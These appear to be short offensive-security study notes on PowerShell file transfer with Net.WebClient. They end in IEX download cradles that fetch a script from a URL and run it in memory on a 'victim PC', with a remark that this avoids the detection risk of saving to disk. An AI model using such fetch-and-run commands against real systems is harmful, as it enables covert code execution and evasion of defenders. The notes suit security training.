With PowerShell directly, there are a few ways you can transfer data some include,
 - OpenRead
 - DownloadData
 - DownloadFile
 - DownloadString

Each of which can be done synchronously (The transfer needing to finish before you can do anything else in the terminal) or asynchronously (You CAN do other stuff while its downloading).
So instead of "OpenRead", it would be "OpenReadAsync"

```powershell
(New-Object Net.WebClient).OpenRead("<URL>")
(New-Object Net.WebClient).DownloadData("<URL>")
(New-Object Net.WebClient).DownloadFile("<URL>", "<Output Path>")
(New-Object Net.WebClient).DownloadString("<URL>")
```

These are the commands for each where:
New-Object - This is just declaring the object
Net.WebCleint - This is the class for web requests
OpenRead() - The method (duh)


But in a situation where you're, for example, transferring a script like a enumeration script to the victim PC, you would want to run it directly without saving, you can use the IEX command to execute the command you just transferred (Note: DownloadFile saves directly to the PC meaning its much more likely to be found)

```powershell
IEX (New-Object Net.WebClient).DownloadString("<URL>")
```
or alternatively you can pipe it with

```powershell
(New-Object Net.WebClient).DownloadString("<URL>") | IEX
```
